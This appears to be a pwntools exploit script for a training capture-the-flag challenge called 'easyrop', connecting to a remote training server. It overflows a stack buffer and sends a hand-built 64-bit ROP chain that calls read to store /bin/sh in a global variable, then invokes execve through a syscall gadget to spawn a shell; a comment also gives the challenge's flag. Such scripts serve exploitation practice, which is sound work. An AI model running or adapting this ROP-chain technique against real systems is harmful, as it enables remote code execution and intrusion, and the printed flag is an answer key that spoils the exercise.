from pwn import *
import time

#r = process("./easyrop")

r = remote("bin.training.jinblack.it", 2015)

#gdb.attach(r, '''
#b * 0x0400275
#''')


#flag{64bit_rop_it_is_even_easier_than_32!}

#goal of the challenge: to call execve
#I use ROPchains in order to call:
#   1. a read, in order to write /bin/sh in an area (in this case the global variable index, because I know its address)
#   2. an execve

#IMPORTANT: since, /bin/sh is retrieved from stdin, when the user passes to the interactive mode, he has to write     /bin/sh\x00 (or just /bin/sh works as well)
#in order to make the exploit work!!!!!!!!

#N.B: I always need to add r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00") since it loads the sum between two 8-bytes inputs in memory

r.recvuntil("Try easyROP!\n")

time.sleep(0.5)

#reaching the EIP on the stack, in order to overflow it
for i in range(14):
    r.send(b"AAAA" * 2)


"""
I don't need to write /bin/sh in this way anymore
#/bin/sh in hexadecimal little endian: 0x0068732f6e69622f, so divided in 2  0068732f  6e69622f

#sending the first part of /bin/sh
r.send(b"\x2f\x62\x69\x6e\x00\x00\x00\x00")
#sending the second part of /bin/sh
r.send(b"\x2f\x73\x68\x00\x00\x00\x00\x00")
"""


#input("press to overflow the EIP...")

time.sleep(0.5)


#goal: to call execve
#using ROPgadget --binary easyrop, I retrieve the addresses of the gadgets that I need, in order to store them

#the first thing to do is to write /bin/sh in memory (precisely in a global variable), I do it with a read
POP_RDI_POP_RSI_POP_RDX_POP_RAX_RET = 0x004001c2      #pop rdi ; pop rsi ; pop rdx ; pop rax ; ret


input("press a key to load the first gadget in memory....")


#jumping in the address of the gadget in order to execute the read:     #pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
r.send(b"\xc2\x01\x40\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")


#RDI needs 0, the fd needs to be stdin
#payload += p64(0)
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RSI needs the address of the global variable where I want to write, I will use index, retrieving its address from Ghidra: 0x00600378
r.send(b"\x78\x03\x60\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RDX needs 7, in order to write 7 bytes for /bin/sh
#N.B: 7 bytes and not 8 because it wouldn't be written just /bin/sh but more characters
#payload += p64(7)
r.send(b"\x07\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RAX needs 0
#payload += p64(0x00)
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")


#calling the read function
READ_ADDRESS = 0x00400144
#payload += p64(READ_ADDRESS)
r.send(b"\x44\x01\x40\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

time.sleep(0.5)


"""
THIS PART IS NOT USEFUL ANYMORE!
string /bin/sh needs to be inserted from stdin through the r.interactive()

#loading /bin/sh in the global variable index

input("press a key to load /bin/sh in memory....")

#sending the first part of /bin/sh
r.send(b"\x2f\x62\x69\x6e\x00\x00\x00\x00")
#sending the second part of /bin/sh
r.send(b"\x2f\x73\x68\x00\x00\x00\x00\x00")
"""

time.sleep(0.5)

input("press a key to load the second gadget in memory....")

#now I can call the execve

#jumping in the address of the gadget in order to execute the read (same gadget as before, with address: 0x004001c2)
r.send(b"\xc2\x01\x40\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")


#RDI, where /bin/sh is in the memory
r.send(b"\x78\x03\x60\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RSI
#payload = p64(0)
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RDX
#payload += p64(0)
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

#RAX
#payload += p64(0x3b)
r.send(b"\x3b\x00\x00\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")


#calling the syscall in order to open the shell

SYSCALL = 0x00400168   #syscall
r.send(b"\x68\x01\x40\x00\x00\x00\x00\x00")
r.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")

input("press a key to make the main return")

#sending two '\n' in order to make the main return
r.sendline()
time.sleep(2)
r.sendline()

input("press to open the interactive to exit the program...")

r.interactive()